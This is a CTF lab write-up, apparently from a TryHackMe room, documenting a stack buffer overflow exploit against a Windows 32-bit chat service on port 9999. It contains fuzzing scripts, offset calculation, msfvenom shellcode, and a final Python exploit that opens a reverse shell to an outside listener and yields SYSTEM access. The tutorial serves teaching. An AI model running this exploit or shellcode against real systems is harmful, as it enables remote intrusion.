---
layout: post
title: Brainstorm
date: 2025-11-16
categories: tryhackme
tags: binary-exploitation buffer-overflow windows
permalink: /:categories/brainstorm
media_subpath: /assets/thm/brainstorm
image:
  path: brainstorm.png
description: In this lab we perform a stack buffer overflow exploit on a chat service running on a windows 32-bit machine.
---


# Summary
---
In this lab we will construct a basic stack buffer overflow exploit to gain control over a system that is running a vulnerable chat service that does not use any memory protections.

## Enumeration
---

We start with a basic `nmap` scan:
```terminal
kali㉿kali $ nmap -T4 -Pn -sV -sC -p- 10.10.205.219 -oA scans/full_tcp
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 14:53 CET
Stats: 0:01:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 14:55 (0:00:12 remaining)
Nmap scan report for 10.10.205.219
Host is up (0.040s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-11-16T13:58:40+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2025-11-15T13:52:28
|_Not valid after:  2026-05-17T13:52:28
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...<SNIP>...
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 291.99 seconds
```

We see that there are three ports open:
- An ftp server that allows anonymous authentication on port **21**
- Microsoft WBT Server, used for e.g. Windows Remote Desktop on port **3389**
- What looks like a chat application on port **9999**

### Port 9999
---
Probing port 9999, we can see that the applications ask for your name and allows you to post messages. We can reasonably conclude that this is the service that is vulnerable to a buffer overflow.

```terminal
kali㉿kali $ nc 10.10.205.219 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): mario
Write a message: hello

Sun Nov 16 06:00:19 2025
mario said: hello

Write a message:  
```

### Port 21
---
As we discovered with `nmap`, we can access the `ftp` server without credentials.

```terminal
kali㉿kali $ ftp anonymous@10.10.205.219
Connected to 10.10.205.219.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.

ftp> passive
Passive mode: off; fallback to active mode: off.

ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-29-19  07:36PM       <DIR>          chatserver
226 Transfer complete.

ftp> cd chatserver
250 CWD command successful.

ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-29-19  09:26PM                43747 chatserver.exe
08-29-19  09:27PM                30761 essfunc.dll
226 Transfer complete.
```
We find that the server is hosting the chat server binary, so we download the files and transfer them to a Windows 11 VM.
```terminal
ftp> binary
200 Type set to I.

ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 EPRT command successful.
...<SNIP>...
226 Transfer complete.
43747 bytes received in 00:00 (157.42 KiB/s)

ftp> get essfunc.dll
local: essfunc.dll remote: essfunc.dll
200 EPRT command successful.
...<SNIP>...
226 Transfer complete.
30761 bytes received in 00:00 (186.21 KiB/s)
```
Furthermore, we find that the chat server is a 32-bit executable.
```terminal
kali㉿kali $ file chatserver.exe        
chatserver.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 (stripped to external PDB), 7 sections
```
## Exploit development
---
To exploit the chat service, we are going to overflow the message buffer to write our payload on the stack, and overwrite the instruction pointer such that the flow of executions is directed to our payload.

To analyse the binary and develop an exploit we are going to use the 32-bit version of [x64dbg](https://github.com/x64dbg/x64dbg){:target="_blank"} (with the [ERC](https://github.com/Andy53/ERC.Xdbg){:target="_blank"} plugin) in our Windows 11 VM.

When we run the chat server in our VM, the service starts listening on port **9999**.

![Chatserver running on port 9999](1.png)
_Chatserver running on port 9999_

### Finding the vulnerable input parameter
---

Earlier we saw that the chat server expects at most 20 characters for the username, and when we try to provide a longer name, the extra characters are seemingly ignored.

![Sending username to the chatserver](2.png)
_Sending username to the chatserver_

However, sending a lot of characters does not seem to crash the server. \
Moving on to the message, we first put 5000 **A**'s on our clipboard

```terminal
kali㉿kali $ python3 -c 'print("A"*5000)' | xclip -sel c 
```

> Here we use `xclip` to put the output directly to our clipboard, without xclip you can copy the output from the terminal instead.
{: .prompt-info }

When we paste the **A**'s and send the message, the server crashes. 

We will use this python script to send progressively longer messages, to see approximately how many characters are needed to overflow the buffer.
```python
import socket
from time import sleep

IP = "127.0.0.1"
port = 9999

def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A" * i
            print(f"Fuzzing {i} bytes")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.recv(1024)
            s.send(b"Mario\r\n")
            sleep(1)
            s.recv(1024)
            s.send(buffer)
            input("press any key to continue")
            s.close()
    except:
        print("Could not establish a connection")

fuzz()
```
The script will establish a connection, receive the welcome text from the server, send our username, and then send an increasing amount of **A**'s.

We find that when we sent **2500** bytes `x64dbg` reports an access violation exception and the instruction pointer, `EIP`, is overwritten with **A**'s. (Note: **0x41** is the ASCII code for **A**)

![Fuzzing results](3.png)
_Fuzzing results_

### Finding the offset to EIP
---
To control `EIP`, we need to know the offset from the start of our input to the `EIP`.
To do this, we will send input that contains a specific pattern that allows us to calculate the offset using the data that `EIP` gets overwritten with. 
To generate the pattern we will use a utility called `pattern_create`.
```terminal
kali㉿kali $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500 | xclip -sel c
```

Now we can use this python script to send the pattern, and then retrieve the content of `EIP`.
```python
import socket

IP = "127.0.0.1"
port = 9999

def eip_offset():
    pattern = bytes("<LONG PATTERN STRING HERE>", "utf-8")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.recv(1024)
    s.send(b"Mario\r\n")
    sleep(1)
    s.recv(1024)
    s.send(pattern)
    input("press any key to continue")
    s.close()

eip_offset()
```

We find that `EIP` gets overwritten with `31704330`.

![Viewing the value of EIP in x64dbg](4.png)
_Viewing the value of `EIP` in `x64dbg`_

Given this information, we can now use the utility `pattern_offset` to calculate the offset.
```terminal
kali㉿kali $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 31704330   
[*] Exact match at offset 2012
```

The offset is **2012**.
### Controlling EIP
---

Using this python script, we send an amount of **A**'s equal to the offset, and then four **B**'s that we want to overwrite `EIP` with.
```python
def eip_control(offset):
    buffer = b"A" * offset
    eip = b"B" * 4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.recv(1024)
    s.send(b"Mario\r\n")
    sleep(1)
    s.recv(1024)
    s.send(payload)
    input("press any key to continue")
    s.close()

eip_control(2012)
```

We see that we have successfully overwritten `EIP` with four **B**'s. (Note: **0x42** is the ascii code for **B**) \
This confirms that the offset is correct, and that we can control `EIP`.

![Viewing the value of EIP in x64dbg after running the python script](5.png)
_Viewing the value of `EIP` in `x64dbg` after running the python script_

### Identifying bad characters
---
Certain characters are used to tell the program that it has reached the end of the input, and these characters can vary depending on how a program processes the input. These characters are known as **bad characters**, as they would terminate our input early, leaving our payload invalid.

To identify bad characters, we will append all possible characters to the input we send, and then compare the program memory to the characters we sent. If there are no bad characters, the program memory would reflect what we sent, and if it differs, it would be due to bad character(s).

To save time, we will assume that the bytes `0x00`, `0x0a`, and `0x0d` are bad, as they often are.

We can use `ERC` to generate characters. Two files will be generated, one `.txt` file where we can copy the characters from to use in our python script, and one `.bin` file that we will use to compare to program memory. 

```console
ERC --bytearray -bytes 0x00,0x0a,0x0d
```

![Running ERC in x64dbg to generate a bytearray](6.png)
_Running `ERC` in `x64dbg` to generate a bytearray_

We can now use this python script to send our payload with the bad characters appended.
```python
def bad_chars(offset):
    all_chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0B, 0x0C, 0x0E, 0x0F, 0x10, 0x11, 0x12,
        0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A,
        0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22,
        0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
        0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32,
        0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A,
        0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42,
        0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,
        0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52,
        0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
        0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62,
        0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A,
        0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72,
        0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A,
        0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82,
        0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A,
        0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92,
        0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A,
        0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2,
        0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA,
        0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2,
        0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA,
        0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2,
        0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA,
        0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2,
        0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA,
        0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0, 0xE1, 0xE2,
        0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA,
        0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0, 0xF1, 0xF2,
        0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA,
        0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    buffer = b"A" * offset
    eip = b"B" * 4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.recv(1024)
    s.send(b"Mario\r\n")
    sleep(1)
    s.recv(1024)
    s.send(payload)
    input("press any key to continue")
    s.close()
    
bad_chars(2012)
```

Then, we use `ERC` to compare the program memory to the `.bin` file. We use the stack pointer (`ESP`) to know where to start to compare, as that is where we are writing our data after overflowing the buffer and `EIP`.

We can find the address that `ESP` holds in `x64dbg`.

![Viewing the value of ESP in x64dbg](7.png)
_Viewing the value of `ESP` in `x64dbg`_

Then we compare the program memory to the `.bin` file.
```console
ERC --compare 0101EEAC C:\Users\User\Desktop\ByteArray_1.bin
```

We can see that the memory lines up perfectly, indicating that there are no more bad characters. If there was another bad character the data would diverge at the point where the character would be.

![Using ERC to compare memory regions in x64dbg](8.png)
_Using `ERC` to compare memory regions in `x64dbg`_

### Finding a module
---
What we need next to perform this simple stack overflow is a module without memory protections. For example, protections like `NX` makes it so that the program cannot execute code on the stack, and `ASLR` randomizes the address space every time the program is run. 
Both would render the attack we are trying ineffective.

To find what modules are available, we will use `ERC`.

```console
ERC --ModuleInfo -NXCompat
```

![Using ERC to view modules in x64dbg](9.png)
_Using `ERC` to view modules in `x64dbg`_

We can see that neither the `chatserver.exe` nor the `.dll` that we found use any protections, so we can use either of them. \
Go to **Symbols**, double click `essfunc.dll`, and search for `jmp esp` with `ctrl+f`.

![Search results in x64dbg](10.png)
_Search results in `x64dbg`_

We can use any of these addresses to overwrite `EIP` with, to direct the flow of execution to the stack where we will write our payload.
### Payload
---

We will use `msfvenom` to generate our shellcode. Since the payload can not contain any bad characters, we denote those with `-b`. First, we will try to pop a calculator as a proof of concept.

```terminal
kali㉿kali $ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00\x0a\x0d'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of python file: 1100 bytes
buf =  b""
buf += b"\xda\xd3\xba\x05\xd2\x3c\x8f\xd9\x74\x24\xf4\x5e"
buf += b"\x31\xc9\xb1\x31\x31\x56\x18\x03\x56\x18\x83\xc6"
buf += b"\x01\x30\xc9\x73\xe1\x36\x32\x8c\xf1\x56\xba\x69"
buf += b"\xc0\x56\xd8\xfa\x72\x67\xaa\xaf\x7e\x0c\xfe\x5b"
buf += b"\xf5\x60\xd7\x6c\xbe\xcf\x01\x42\x3f\x63\x71\xc5"
buf += b"\xc3\x7e\xa6\x25\xfa\xb0\xbb\x24\x3b\xac\x36\x74"
buf += b"\x94\xba\xe5\x69\x91\xf7\x35\x01\xe9\x16\x3e\xf6"
buf += b"\xb9\x19\x6f\xa9\xb2\x43\xaf\x4b\x17\xf8\xe6\x53"
buf += b"\x74\xc5\xb1\xe8\x4e\xb1\x43\x39\x9f\x3a\xef\x04"
buf += b"\x10\xc9\xf1\x41\x96\x32\x84\xbb\xe5\xcf\x9f\x7f"
buf += b"\x94\x0b\x15\x64\x3e\xdf\x8d\x40\xbf\x0c\x4b\x02"
buf += b"\xb3\xf9\x1f\x4c\xd7\xfc\xcc\xe6\xe3\x75\xf3\x28"
buf += b"\x62\xcd\xd0\xec\x2f\x95\x79\xb4\x95\x78\x85\xa6"
buf += b"\x76\x24\x23\xac\x9a\x31\x5e\xef\xf0\xc4\xec\x95"
buf += b"\xb6\xc7\xee\x95\xe6\xaf\xdf\x1e\x69\xb7\xdf\xf4"
buf += b"\xce\x47\xaa\x55\x66\xc0\x73\x0c\x3b\x8d\x83\xfa"
buf += b"\x7f\xa8\x07\x0f\xff\x4f\x17\x7a\xfa\x14\x9f\x96"
buf += b"\x76\x04\x4a\x99\x25\x25\x5f\xfa\xa8\xb5\x03\xd3"
buf += b"\x4f\x3e\xa1\x2b"
```

To construct the entire payload, we will use the `jmp esp` address we found earlier instead of four **B**'s as we did before, and we will use the `struct` library as the address needs to be [little-endian](https://en.wikipedia.org/wiki/Endianness){:target="_blank"}. \
Furthermore, due to how stack frames and stack alignment work, `ESP` might be slightly different after `jmp esp` has been executed. \
To circumvent potential crashes, we can pad our payload with a couple of **NOP**s (no operation, machine code **0x90**). When these instructions are hit, the CPU will simply do nothing. This technique is known as a [NOP slide](https://en.wikipedia.org/wiki/NOP_slide){:target="_blank"}.

```python
import socket
from struct import pack
from time import sleep

IP = "<MACHINE IP>"
PORT = 9999

def exploit(offset):
    buf =  b""
	buf += b"\xda\xd3\xba\x05\xd2\x3c\x8f\xd9\x74\x24\xf4\x5e"
	buf += b"\x31\xc9\xb1\x31\x31\x56\x18\x03\x56\x18\x83\xc6"
	buf += b"\x01\x30\xc9\x73\xe1\x36\x32\x8c\xf1\x56\xba\x69"
	buf += b"\xc0\x56\xd8\xfa\x72\x67\xaa\xaf\x7e\x0c\xfe\x5b"
	buf += b"\xf5\x60\xd7\x6c\xbe\xcf\x01\x42\x3f\x63\x71\xc5"
	buf += b"\xc3\x7e\xa6\x25\xfa\xb0\xbb\x24\x3b\xac\x36\x74"
	buf += b"\x94\xba\xe5\x69\x91\xf7\x35\x01\xe9\x16\x3e\xf6"
	buf += b"\xb9\x19\x6f\xa9\xb2\x43\xaf\x4b\x17\xf8\xe6\x53"
	buf += b"\x74\xc5\xb1\xe8\x4e\xb1\x43\x39\x9f\x3a\xef\x04"
	buf += b"\x10\xc9\xf1\x41\x96\x32\x84\xbb\xe5\xcf\x9f\x7f"
	buf += b"\x94\x0b\x15\x64\x3e\xdf\x8d\x40\xbf\x0c\x4b\x02"
	buf += b"\xb3\xf9\x1f\x4c\xd7\xfc\xcc\xe6\xe3\x75\xf3\x28"
	buf += b"\x62\xcd\xd0\xec\x2f\x95\x79\xb4\x95\x78\x85\xa6"
	buf += b"\x76\x24\x23\xac\x9a\x31\x5e\xef\xf0\xc4\xec\x95"
	buf += b"\xb6\xc7\xee\x95\xe6\xaf\xdf\x1e\x69\xb7\xdf\xf4"
	buf += b"\xce\x47\xaa\x55\x66\xc0\x73\x0c\x3b\x8d\x83\xfa"
	buf += b"\x7f\xa8\x07\x0f\xff\x4f\x17\x7a\xfa\x14\x9f\x96"
	buf += b"\x76\x04\x4a\x99\x25\x25\x5f\xfa\xa8\xb5\x03\xd3"
	buf += b"\x4f\x3e\xa1\x2b"

    buffer = b"A" * offset
    eip = pack('<L', 0x625014DF) # little endian
    nops = b"\x90" * 32
    payload = buffer + eip + nops + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    s.recv(1024)
    s.send(b"Mario\r\n")
    sleep(1)
    s.recv(1024)
    s.send(payload)
    input("press any key to continue")
    s.close()
    
exploit(2012)
```

We run the exploit, the chat server crashes, and we pop a calculator.

![Popping a calculator after running our exploit](11.png)
_Popping a calculator after running our exploit_

Now, to exploit the real server, we generate a reverse shell payload.
```terminal
kali㉿kali $ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.14.111.160 LPORT=80 -b '\x00\x0a\x0d' -f 'python'
```
### The Final Exploit

```python
import socket
from struct import pack
from time import sleep

IP = "<MACHINE IP>"
PORT = 9999

def exploit(offset):
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.14.111.160 LPORT=80 -b '\x00\x0a\x0d' -f 'python'
    buf =  b""
    buf += b"\xbb\x76\xd2\xa7\xb6\xda\xd3\xd9\x74\x24\xf4\x5a"
    buf += b"\x33\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x0e\x03\x2c"
    buf += b"\xdc\x45\x43\x2c\x08\x0b\xac\xcc\xc9\x6c\x24\x29"
    buf += b"\xf8\xac\x52\x3a\xab\x1c\x10\x6e\x40\xd6\x74\x9a"
    buf += b"\xd3\x9a\x50\xad\x54\x10\x87\x80\x65\x09\xfb\x83"
    buf += b"\xe5\x50\x28\x63\xd7\x9a\x3d\x62\x10\xc6\xcc\x36"
    buf += b"\xc9\x8c\x63\xa6\x7e\xd8\xbf\x4d\xcc\xcc\xc7\xb2"
    buf += b"\x85\xef\xe6\x65\x9d\xa9\x28\x84\x72\xc2\x60\x9e"
    buf += b"\x97\xef\x3b\x15\x63\x9b\xbd\xff\xbd\x64\x11\x3e"
    buf += b"\x72\x97\x6b\x07\xb5\x48\x1e\x71\xc5\xf5\x19\x46"
    buf += b"\xb7\x21\xaf\x5c\x1f\xa1\x17\xb8\xa1\x66\xc1\x4b"
    buf += b"\xad\xc3\x85\x13\xb2\xd2\x4a\x28\xce\x5f\x6d\xfe"
    buf += b"\x46\x1b\x4a\xda\x03\xff\xf3\x7b\xee\xae\x0c\x9b"
    buf += b"\x51\x0e\xa9\xd0\x7c\x5b\xc0\xbb\xe8\xa8\xe9\x43"
    buf += b"\xe9\xa6\x7a\x30\xdb\x69\xd1\xde\x57\xe1\xff\x19"
    buf += b"\x97\xd8\xb8\xb5\x66\xe3\xb8\x9c\xac\xb7\xe8\xb6"
    buf += b"\x05\xb8\x62\x46\xa9\x6d\x24\x16\x05\xde\x85\xc6"
    buf += b"\xe5\x8e\x6d\x0c\xea\xf1\x8e\x2f\x20\x9a\x25\xca"
    buf += b"\xa3\xaf\xb7\xbb\x93\xd8\xc5\x43\xd4\x48\x43\xa5"
    buf += b"\xbe\x78\x05\x7e\x57\xe0\x0c\xf4\xc6\xed\x9a\x71"
    buf += b"\xc8\x66\x29\x86\x87\x8e\x44\x94\x70\x7f\x13\xc6"
    buf += b"\xd7\x80\x89\x6e\xbb\x13\x56\x6e\xb2\x0f\xc1\x39"
    buf += b"\x93\xfe\x18\xaf\x09\x58\xb3\xcd\xd3\x3c\xfc\x55"
    buf += b"\x08\xfd\x03\x54\xdd\xb9\x27\x46\x1b\x41\x6c\x32"
    buf += b"\xf3\x14\x3a\xec\xb5\xce\x8c\x46\x6c\xbc\x46\x0e"
    buf += b"\xe9\x8e\x58\x48\xf6\xda\x2e\xb4\x47\xb3\x76\xcb"
    buf += b"\x68\x53\x7f\xb4\x94\xc3\x80\x6f\x1d\xf3\xca\x2d"
    buf += b"\x34\x9c\x92\xa4\x04\xc1\x24\x13\x4a\xfc\xa6\x91"
    buf += b"\x33\xfb\xb7\xd0\x36\x47\x70\x09\x4b\xd8\x15\x2d"
    buf += b"\xf8\xd9\x3f"

    buffer = b"A" * offset
    eip = pack('<L', 0x625014DF) # little endian
    nops = b"\x90" * 32
    payload = buffer + eip + nops + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    s.recv(1024)
    s.send(b"Mario\r\n")
    sleep(1)
    s.recv(1024)
    s.send(payload)
    input("press any key to continue")
    s.close()

exploit(2012)
```

We start a netcat listener on port **80**, and run the exploit.
```terminal
kali㉿kali $ nc -lvnp 80
listening on [any] 80 ...
connect to [10.14.111.160] from (UNKNOWN) [10.10.29.210] 49353
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

We find the flag in `C:\Users\drake\Desktop`.

```terminal
C:\Users\drake\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users\drake\Desktop

08/29/2019  09:55 PM    <DIR>          .
08/29/2019  09:55 PM    <DIR>          ..
08/29/2019  09:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,559,358,464 bytes free
               
C:\Users\drake\Desktop>type root.txt
5b[REDACTED]8a
```

